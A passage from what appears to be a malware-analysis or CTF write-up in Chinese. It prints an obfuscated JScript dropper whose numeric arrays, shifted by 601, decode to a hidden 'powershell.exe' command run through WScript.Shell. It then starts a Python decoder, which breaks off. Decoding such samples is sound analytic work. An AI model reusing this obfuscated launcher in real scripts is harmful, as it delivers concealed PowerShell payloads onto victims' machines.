class="hljs-number">698</span>, <span class="hljs-number">651</span>, <span class="hljs-number">698</span>, <span class="hljs-number">657</span>, <span class="hljs-number">702</span>, <span class="hljs-number">699</span>, <span class="hljs-number">702</span>, <span class="hljs-number">649</span>, <span class="hljs-number">702</span>, <span class="hljs-number">702</span>, <span class="hljs-number">658</span>, <span class="hljs-number">703</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">699</span>, <span class="hljs-number">657</span>, <span class="hljs-number">702</span>, <span class="hljs-number">650</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">699</span>, <span class="hljs-number">702</span>, <span class="hljs-number">698</span>, <span class="hljs-number">654</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">698</span>, <span class="hljs-number">702</span>, <span class="hljs-number">698</span>, <span class="hljs-number">649</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">702</span>, <span class="hljs-number">700</span>, <span class="hljs-number">703</span>, <span class="hljs-number">703</span>, <span class="hljs-number">702</span>, <span class="hljs-number">700</span>, <span class="hljs-number">702</span>, <span class="hljs-number">699</span>, <span class="hljs-number">698</span>, <span class="hljs-number">653</span>, <span class="hljs-number">699</span>, <span class="hljs-number">657</span>, <span class="hljs-number">699</span>, <span class="hljs-number">657</span>, <span class="hljs-number">699</span>, <span class="hljs-number">700</span>, <span class="hljs-number">703</span>, <span class="hljs-number">655</span>, <span class="hljs-number">702</span>, <span class="hljs-number">652</span>, <span class="hljs-number">702</span>, <span class="hljs-number">652</span>, <span class="hljs-number">698</span>, <span class="hljs-number">699</span>, <span class="hljs-number">699</span>, <span class="hljs-number">655</span>, <span class="hljs-number">702</span>, <span class="hljs-number">651</span>, <span class="hljs-number">698</span>, <span class="hljs-number">654</span>, <span class="hljs-number">698</span>, <span class="hljs-number">650</span>, <span class="hljs-number">699</span>, <span class="hljs-number">653</span>, <span class="hljs-number">698</span>, <span class="hljs-number">702</span>, <span class="hljs-number">699</span>, <span class="hljs-number">657</span>, <span class="hljs-number">702</span>, <span class="hljs-number">651</span>, <span class="hljs-number">698</span>, <span class="hljs-number">703</span>, <span class="hljs-number">698</span>, <span class="hljs-number">651</span>, <span class="hljs-number">703</span>, <span class="hljs-number">655</span>, <span class="hljs-number">703</span>, <span class="hljs-number">702</span>, <span class="hljs-number">703</span>, <span class="hljs-number">700</span>, <span class="hljs-number">703</span>, <span class="hljs-number">699</span>, <span class="hljs-number">703</span>, <span class="hljs-number">699</span>, <span class="hljs-number">703</span>, <span class="hljs-number">653</span>, <span class="hljs-number">702</span>, <span class="hljs-number">652</span>, <span class="hljs-number">698</span>, <span class="hljs-number">702</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">699</span>, <span class="hljs-number">703</span>, <span class="hljs-number">699</span>, <span class="hljs-number">657</span>, <span class="hljs-number">699</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">657</span>, <span class="hljs-number">698</span>, <span class="hljs-number">657</span>, <span class="hljs-number">698</span>, <span class="hljs-number">654</span>, <span class="hljs-number">698</span>, <span class="hljs-number">651</span>, <span class="hljs-number">698</span>, <span class="hljs-number">699</span>, <span class="hljs-number">702</span>, <span class="hljs-number">651</span>, <span class="hljs-number">698</span>, <span class="hljs-number">655</span>, <span class="hljs-number">699</span>, <span class="hljs-number">700</span>, <span class="hljs-number">698</span>, <span class="hljs-number">699</span>, <span class="hljs-number">702</span>, <span class="hljs-number">699</span>, <span class="hljs-number">703</span>, <span class="hljs-number">656</span>, <span class="hljs-number">658</span>, <span class="hljs-number">703</span>, <span class="hljs-number">657</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">700</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">699</span>, <span class="hljs-number">702</span>, <span class="hljs-number">698</span>, <span class="hljs-number">654</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">698</span>, <span class="hljs-number">702</span>, <span class="hljs-number">698</span>, <span class="hljs-number">649</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">703</span>, <span class="hljs-number">655</span>, <span class="hljs-number">702</span>, <span class="hljs-number">652</span>, <span class="hljs-number">658</span>, <span class="hljs-number">655</span>, <span class="hljs-number">703</span>, <span class="hljs-number">657</span>, <span class="hljs-number">657</span>, <span class="hljs-number">657</span>, <span class="hljs-number">702</span>, <span class="hljs-number">700</span>, <span class="hljs-number">702</span>, <span class="hljs-number">699</span>, <span class="hljs-number">657</span>, <span class="hljs-number">651</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">699</span>, <span class="hljs-number">657</span>, <span class="hljs-number">702</span>, <span class="hljs-number">651</span>, <span class="hljs-number">658</span>, <span class="hljs-number">699</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">702</span>, <span class="hljs-number">657</span>, <span class="hljs-number">703</span>, <span class="hljs-number">698</span>, <span class="hljs-number">649</span>, <span class="hljs-number">698</span>, <span class="hljs-number">654</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">651</span>, <span class="hljs-number">699</span>, <span class="hljs-number">657</span>, <span class="hljs-number">702</span>, <span class="hljs-number">699</span>, <span class="hljs-number">703</span>, <span class="hljs-number">656</span>, <span class="hljs-number">698</span>, <span class="hljs-number">703</span>, <span class="hljs-number">698</span>, <span class="hljs-number">657</span>, <span class="hljs-number">703</span>, <span class="hljs-number">656</span>, <span class="hljs-number">658</span>, <span class="hljs-number">703</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">702</span>, <span class="hljs-number">700</span>, <span class="hljs-number">698</span>, <span class="hljs-number">703</span>, <span class="hljs-number">703</span>, <span class="hljs-number">657</span>, <span class="hljs-number">657</span>, <span class="hljs-number">653</span>, <span class="hljs-number">702</span>, <span class="hljs-number">700</span>, <span class="hljs-number">702</span>, <span class="hljs-number">653</span>, <span class="hljs-number">702</span>, <span class="hljs-number">651</span>, <span class="hljs-number">698</span>, <span class="hljs-number">700</span>, <span class="hljs-number">702</span>, <span class="hljs-number">657</span>, <span class="hljs-number">657</span>, <span class="hljs-number">658</span>, <span class="hljs-number">699</span>, <span class="hljs-number">653</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">703</span>, <span class="hljs-number">699</span>, <span class="hljs-number">658</span>, <span class="hljs-number">699</span>, <span class="hljs-number">657</span>, <span class="hljs-number">698</span>, <span class="hljs-number">654</span>, <span class="hljs-number">698</span>, <span class="hljs-number">652</span>, <span class="hljs-number">698</span>, <span class="hljs-number">651</span>, <span class="hljs-number">657</span>, <span class="hljs-number">703</span>, <span class="hljs-number">698</span>, <span class="hljs-number">652</span>, <span class="hljs-number">698</span>, <span class="hljs-number">651</span>, <span class="hljs-number">699</span>, <span class="hljs-number">657</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">699</span>, <span class="hljs-number">653</span>, <span class="hljs-number">699</span>, <span class="hljs-number">657</span>, <span class="hljs-number">702</span>, <span class="hljs-number">651</span>, <span class="hljs-number">657</span>, <span class="hljs-number">654</span>, <span class="hljs-number">698</span>, <span class="hljs-number">651</span>, <span class="hljs-number">699</span>, <span class="hljs-number">698</span>, <span class="hljs-number">698</span>, <span class="hljs-number">652</span>, <span class="hljs-number">698</span>, <span class="hljs-number">656</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">657</span>, <span class="hljs-number">703</span>, <span class="hljs-number">698</span>, <span class="hljs-number">652</span>, <span class="hljs-number">698</span>, <span class="hljs-number">650</span>, <span class="hljs-number">698</span>, <span class="hljs-number">650</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">698</span>, <span class="hljs-number">651</span>, <span class="hljs-number">698</span>, <span class="hljs-number">657</span>, <span class="hljs-number">699</span>, <span class="hljs-number">649</span>, <span class="hljs-number">657</span>, <span class="hljs-number">699</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">699</span>, <span class="hljs-number">657</span>, <span class="hljs-number">702</span>, <span class="hljs-number">650</span>, <span class="hljs-number">657</span>, <span class="hljs-number">650</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">650</span>, <span class="hljs-number">698</span>, <span class="hljs-number">702</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">699</span>, <span class="hljs-number">702</span>, <span class="hljs-number">699</span>, <span class="hljs-number">649</span>, <span class="hljs-number">658</span>, <span class="hljs-number">699</span>, <span class="hljs-number">698</span>, <span class="hljs-number">653</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">699</span>, <span class="hljs-number">702</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">699</span>, <span class="hljs-number">656</span>, <span class="hljs-number">702</span>, <span class="hljs-number">653</span>, <span class="hljs-number">657</span>, <span class="hljs-number">699</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">702</span>, <span class="hljs-number">700</span>, <span class="hljs-number">658</span>, <span class="hljs-number">652</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">651</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">698</span>, <span class="hljs-number">649</span>, <span class="hljs-number">699</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">702</span>, <span class="hljs-number">651</span>, <span class="hljs-number">657</span>, <span class="hljs-number">651</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">698</span>, <span class="hljs-number">650</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">702</span>, <span class="hljs-number">650</span>, <span class="hljs-number">698</span>, <span class="hljs-number">703</span>, <span class="hljs-number">698</span>, <span class="hljs-number">649</span>, <span class="hljs-number">698</span>, <span class="hljs-number">654</span>, <span class="hljs-number">698</span>, <span class="hljs-number">656</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">702</span>, <span class="hljs-number">699</span>, <span class="hljs-number">702</span>, <span class="hljs-number">655</span>, <span class="hljs-number">698</span>, <span class="hljs-number">657</span>, <span class="hljs-number">657</span>, <span class="hljs-number">651</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">698</span>, <span class="hljs-number">650</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">702</span>, <span class="hljs-number">699</span>, <span class="hljs-number">699</span>, <span class="hljs-number">650</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">651</span>, <span class="hljs-number">657</span>, <span class="hljs-number">651</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">698</span>, <span class="hljs-number">650</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">651</span>, <span class="hljs-number">657</span>, <span class="hljs-number">654</span>, <span class="hljs-number">698</span>, <span class="hljs-number">651</span>, <span class="hljs-number">699</span>, <span class="hljs-number">698</span>, <span class="hljs-number">698</span>, <span class="hljs-number">652</span>, <span class="hljs-number">698</span>, <span class="hljs-number">656</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">702</span>, <span class="hljs-number">653</span>, <span class="hljs-number">702</span>, <span class="hljs-number">699</span>, <span class="hljs-number">657</span>, <span class="hljs-number">651</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">702</span>, <span class="hljs-number">655</span>, <span class="hljs-number">698</span>, <span class="hljs-number">703</span>, <span class="hljs-number">699</span>, <span class="hljs-number">657</span>, <span class="hljs-number">702</span>, <span class="hljs-number">699</span>, <span class="hljs-number">702</span>, <span class="hljs-number">649</span>, <span class="hljs-number">703</span>, <span class="hljs-number">701</span>, <span class="hljs-number">702</span>, <span class="hljs-number">649</span>, <span class="hljs-number">703</span>, <span class="hljs-number">701</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">653</span>, <span class="hljs-number">657</span>, <span class="hljs-number">649</span>, <span class="hljs-number">658</span>, <span class="hljs-number">703</span>, <span class="hljs-number">702</span>, <span class="hljs-number">700</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">699</span>, <span class="hljs-number">702</span>, <span class="hljs-number">698</span>, <span class="hljs-number">654</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">698</span>, <span class="hljs-number">702</span>, <span class="hljs-number">698</span>, <span class="hljs-number">649</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">703</span>, <span class="hljs-number">655</span>, <span class="hljs-number">702</span>, <span class="hljs-number">652</span>, <span class="hljs-number">658</span>, <span class="hljs-number">655</span>, <span class="hljs-number">703</span>, <span class="hljs-number">657</span>, <span class="hljs-number">657</span>, <span class="hljs-number">657</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">651</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">698</span>, <span class="hljs-number">649</span>, <span class="hljs-number">699</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">703</span>, <span class="hljs-number">656</span>, <span class="hljs-number">658</span>, <span class="hljs-number">703</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">702</span>, <span class="hljs-number">700</span>, <span class="hljs-number">657</span>, <span class="hljs-number">701</span>, <span class="hljs-number">702</span>, <span class="hljs-number">700</span>, <span class="hljs-number">702</span>, <span class="hljs-number">653</span>, <span class="hljs-number">702</span>, <span class="hljs-number">653</span>, <span class="hljs-number">702</span>, <span class="hljs-number">653</span>, <span class="hljs-number">702</span>, <span class="hljs-number">653</span>, <span class="hljs-number">657</span>, <span class="hljs-number">699</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">699</span>, <span class="hljs-number">657</span>, <span class="hljs-number">702</span>, <span class="hljs-number">650</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">699</span>, <span class="hljs-number">702</span>, <span class="hljs-number">698</span>, <span class="hljs-number">654</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">698</span>, <span class="hljs-number">702</span>, <span class="hljs-number">698</span>, <span class="hljs-number">649</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">702</span>, <span class="hljs-number">700</span>, <span class="hljs-number">698</span>, <span class="hljs-number">703</span>, <span class="hljs-number">703</span>, <span class="hljs-number">657</span>, <span class="hljs-number">657</span>, <span class="hljs-number">653</span>, <span class="hljs-number">702</span>, <span class="hljs-number">700</span>, <span class="hljs-number">702</span>, <span class="hljs-number">650</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">698</span>, <span class="hljs-number">649</span>, <span class="hljs-number">699</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">657</span>, <span class="hljs-number">652</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">699</span>, <span class="hljs-number">649</span>, <span class="hljs-number">657</span>, <span class="hljs-number">699</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">699</span>, <span class="hljs-number">657</span>, <span class="hljs-number">702</span>, <span class="hljs-number">650</span>, <span class="hljs-number">657</span>, <span class="hljs-number">650</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">650</span>, <span class="hljs-number">698</span>, <span class="hljs-number">702</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">699</span>, <span class="hljs-number">702</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">658</span>, <span class="hljs-number">656</span>, <span class="hljs-number">703</span>, <span class="hljs-number">702</span>, <span class="hljs-number">658</span>, <span class="hljs-number">650</span>, <span class="hljs-number">702</span>, <span class="hljs-number">651</span>, <span class="hljs-number">657</span>, <span class="hljs-number">651</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">698</span>, <span class="hljs-number">650</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">651</span>, <span class="hljs-number">657</span>, <span class="hljs-number">654</span>, <span class="hljs-number">698</span>, <span class="hljs-number">651</span>, <span class="hljs-number">699</span>, <span class="hljs-number">698</span>, <span class="hljs-number">698</span>, <span class="hljs-number">652</span>, <span class="hljs-number">698</span>, <span class="hljs-number">656</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">702</span>, <span class="hljs-number">653</span>, <span class="hljs-number">702</span>, <span class="hljs-number">699</span>, <span class="hljs-number">657</span>, <span class="hljs-number">651</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">702</span>, <span class="hljs-number">655</span>, <span class="hljs-number">698</span>, <span class="hljs-number">703</span>, <span class="hljs-number">699</span>, <span class="hljs-number">657</span>, <span class="hljs-number">702</span>, <span class="hljs-number">699</span>, <span class="hljs-number">702</span>, <span class="hljs-number">649</span>, <span class="hljs-number">703</span>, <span class="hljs-number">701</span>, <span class="hljs-number">702</span>, <span class="hljs-number">649</span>, <span class="hljs-number">703</span>, <span class="hljs-number">701</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">653</span>, <span class="hljs-number">657</span>, <span class="hljs-number">649</span>, <span class="hljs-number">658</span>, <span class="hljs-number">703</span>, <span class="hljs-number">702</span>, <span class="hljs-number">700</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">699</span>, <span class="hljs-number">702</span>, <span class="hljs-number">698</span>, <span class="hljs-number">654</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">698</span>, <span class="hljs-number">702</span>, <span class="hljs-number">698</span>, <span class="hljs-number">649</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">703</span>, <span class="hljs-number">655</span>, <span class="hljs-number">702</span>, <span class="hljs-number">652</span>, <span class="hljs-number">658</span>, <span class="hljs-number">655</span>, <span class="hljs-number">703</span>, <span class="hljs-number">657</span>, <span class="hljs-number">657</span>, <span class="hljs-number">657</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">651</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">698</span>, <span class="hljs-number">649</span>, <span class="hljs-number">699</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">703</span>, <span class="hljs-number">656</span>, <span class="hljs-number">658</span>, <span class="hljs-number">703</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">702</span>, <span class="hljs-number">700</span>, <span class="hljs-number">657</span>, <span class="hljs-number">701</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">651</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">698</span>, <span class="hljs-number">649</span>, <span class="hljs-number">699</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">651</span>, <span class="hljs-number">657</span>, <span class="hljs-number">654</span>, <span class="hljs-number">698</span>, <span class="hljs-number">651</span>, <span class="hljs-number">699</span>, <span class="hljs-number">698</span>, <span class="hljs-number">698</span>, <span class="hljs-number">652</span>, <span class="hljs-number">698</span>, <span class="hljs-number">656</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">702</span>, <span class="hljs-number">653</span>, <span class="hljs-number">702</span>, <span class="hljs-number">653</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">699</span>, <span class="hljs-number">702</span>, <span class="hljs-number">698</span>, <span class="hljs-number">654</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">698</span>, <span class="hljs-number">702</span>, <span class="hljs-number">698</span>, <span class="hljs-number">649</span>, <span class="hljs-number">698</span>, <span class="hljs-number">658</span>, <span class="hljs-number">702</span>, <span class="hljs-number">700</span>, <span class="hljs-number">703</span>, <span class="hljs-number">703</span>, <span class="hljs-number">702</span>, <span class="hljs-number">700</span>, <span class="hljs-number">702</span>, <span class="hljs-number">650</span>, <span class="hljs-number">658</span>, <span class="hljs-number">698</span>, <span class="hljs-number">698</span>, <span class="hljs-number">701</span>, <span class="hljs-number">698</span>, <span class="hljs-number">649</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">654</span>, <span class="hljs-number">702</span>, <span class="hljs-number">702</span>, <span class="hljs-number">703</span>, <span class="hljs-number">656</span>, <span class="hljs-number">640</span>, <span class="hljs-number">645</span>, <span class="hljs-number">640</span>, <span class="hljs-number">647</span>, <span class="hljs-number">724</span>, <span class="hljs-number">651</span>, <span class="hljs-number">726</span>, <span class="hljs-number">640</span>, <span class="hljs-number">642</span>, <span class="hljs-number">633</span>, <span class="hljs-number">725</span>, <span class="hljs-number">633</span>, <span class="hljs-number">638</span>, <span class="hljs-number">633</span>, <span class="hljs-number">724</span>, <span class="hljs-number">633</span>, <span class="hljs-number">692</span>, <span class="hljs-number">700</span>, <span class="hljs-number">705</span>, <span class="hljs-number">698</span>, <span class="hljs-number">715</span>, <span class="hljs-number">694</span>, <span class="hljs-number">641</span>, <span class="hljs-number">692</span>, <span class="hljs-number">668</span>, <span class="hljs-number">712</span>, <span class="hljs-number">711</span>, <span class="hljs-number">719</span>, <span class="hljs-number">702</span>, <span class="hljs-number">715</span>, <span class="hljs-number">717</span>, <span class="hljs-number">694</span>, <span class="hljs-number">659</span>, <span class="hljs-number">659</span>, <span class="hljs-number">685</span>, <span class="hljs-number">712</span>, <span class="hljs-number">667</span>, <span class="hljs-number">722</span>, <span class="hljs-number">717</span>, <span class="hljs-number">702</span>, <span class="hljs-number">641</span>, <span class="hljs-number">637</span>, <span class="hljs-number">696</span>, <span class="hljs-number">647</span>, <span class="hljs-number">687</span>, <span class="hljs-number">698</span>, <span class="hljs-number">709</span>, <span class="hljs-number">718</span>, <span class="hljs-number">702</span>, <span class="hljs-number">645</span>, <span class="hljs-number">650</span>, <span class="hljs-number">655</span>, <span class="hljs-number">642</span>, <span class="hljs-number">633</span>, <span class="hljs-number">646</span>, <span class="hljs-number">699</span>, <span class="hljs-number">721</span>, <span class="hljs-number">712</span>, <span class="hljs-number">715</span>, <span class="hljs-number">633</span>, <span class="hljs-number">640</span>, <span class="hljs-number">651</span>, <span class="hljs-number">649</span>, <span class="hljs-number">653</span>, <span class="hljs-number">640</span>, <span class="hljs-number">642</span>, <span class="hljs-number">633</span>, <span class="hljs-number">726</span>, <span class="hljs-number">642</span>, <span class="hljs-number">633</span>, <span class="hljs-number">646</span>, <span class="hljs-number">707</span>, <span class="hljs-number">712</span>, <span class="hljs-number">706</span>, <span class="hljs-number">711</span>, <span class="hljs-number">633</span>, <span class="hljs-number">640</span>, <span class="hljs-number">640</span>, <span class="hljs-number">660</span>, <span class="hljs-number">639</span>, <span class="hljs-number">633</span>, <span class="hljs-number">637</span>, <span class="hljs-number">670</span>, <span class="hljs-number">671</span>, <span class="hljs-number">685</span>, <span class="hljs-number">670</span>, <span class="hljs-number">647</span>, <span class="hljs-number">684</span>, <span class="hljs-number">718</span>, <span class="hljs-number">699</span>, <span class="hljs-number">716</span>, <span class="hljs-number">717</span>, <span class="hljs-number">715</span>, <span class="hljs-number">706</span>, <span class="hljs-number">711</span>, <span class="hljs-number">704</span>, <span class="hljs-number">641</span>, <span class="hljs-number">649</span>, <span class="hljs-number">645</span>, <span class="hljs-number">652</span>, <span class="hljs-number">642</span>, <span class="hljs-number">633</span>, <span class="hljs-number">637</span>, <span class="hljs-number">670</span>, <span class="hljs-number">671</span>, <span class="hljs-number">685</span>, <span class="hljs-number">670</span>, <span class="hljs-number">647</span>, <span class="hljs-number">684</span>, <span class="hljs-number">718</span>, <span class="hljs-number">699</span>, <span class="hljs-number">716</span>, <span class="hljs-number">717</span>, <span class="hljs-number">715</span>, <span class="hljs-number">706</span>, <span class="hljs-number">711</span>, <span class="hljs-number">704</span>, <span class="hljs-number">641</span>, <span class="hljs-number">652</span>, <span class="hljs-number">642</span>]);<span class="hljs-keyword">var</span> emGK = <span class="hljs-title function_">ioRjQN</span>([<span class="hljs-number">688</span>,<span class="hljs-number">684</span>,<span class="hljs-number">700</span>,<span class="hljs-number">715</span>,<span class="hljs-number">706</span>,<span class="hljs-number">713</span>,<span class="hljs-number">717</span>,<span class="hljs-number">647</span>,<span class="hljs-number">684</span>,<span class="hljs-number">705</span>,<span class="hljs-number">702</span>,<span class="hljs-number">709</span>,<span class="hljs-number">709</span>]);<span class="hljs-keyword">var</span> ioRjQN = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(emGK);ioRjQN.<span class="hljs-title class_">Run</span>(ohyLbg, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p>可知 每个数要减去 601，然后转成字符<br>解码脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">arr</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">chr</span>(x - <span class="hljs-number">601</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> arr)<br><br>ohyLbg_data = [<span class="hljs-number">713</span>, <span class="hljs-number">712</span>, <span class="hljs-number">720</span>, <span class="hljs-number">702</span>, <span class="hljs-number">715</span>, <span class="hljs-number">716</span>, <span class="hljs-number">705</span>, <span class="hljs-number">702</span>, <span class="hljs-number">709</span>, <span class="hljs-number">709</span>, <span class="hljs-number">647</span>, <span class="hljs-number">702</span>, <span class="hljs-number">721</span>, <span class="hljs-number">702</span>, <span class="hljs-number">633</span>, <span class="hljs-number">646</span>, <span class="hljs-number">720</span>, <span class="hljs-number">633</span>, <span class="hljs-number">650</span>, <span class="hljs-number">633</span>, <span class="hljs-number">646</span>, <span class="hljs-number">702</span>, <span class="hljs-number">713</span>, <span class="hljs-number">633</span>, <span class="hljs-number">686</span>, <span class="hljs-number">711</span>, <span class="hljs-number">715</span>, <span class="hljs-number">702</span>, <span class="hljs-number">716</span>, <span class="hljs-number">717</span>, <span class="hljs-number">715</span>, <span class="hljs-number">706</span>, <span class="hljs-number">700</span>, <span class="hljs-number">717</span>, <span class="hljs-number">702</span>, <span class="hljs-number">701</span>, <span class="hljs-number">633</span>, <span class="hljs-number">646</span>, <span class="hljs-number">711</span>, <span class="hljs-number">712</span>, <span class="hljs-number">713</span>, <span class="hljs-number">633</span>, <span class="hljs-number">637</span>, <span class="hljs-number">670</span>, <span class="hljs-number">671</span>, <span class="hljs-number">685</span>, <span class="hljs-number">670</span>, <span class="hljs-number">633</span>, <span class="hljs-number">662</span>, <span class="hljs-number">641</span>, <span class="hljs-number">692</span>, <span class="hljs-number">715</span>, <span 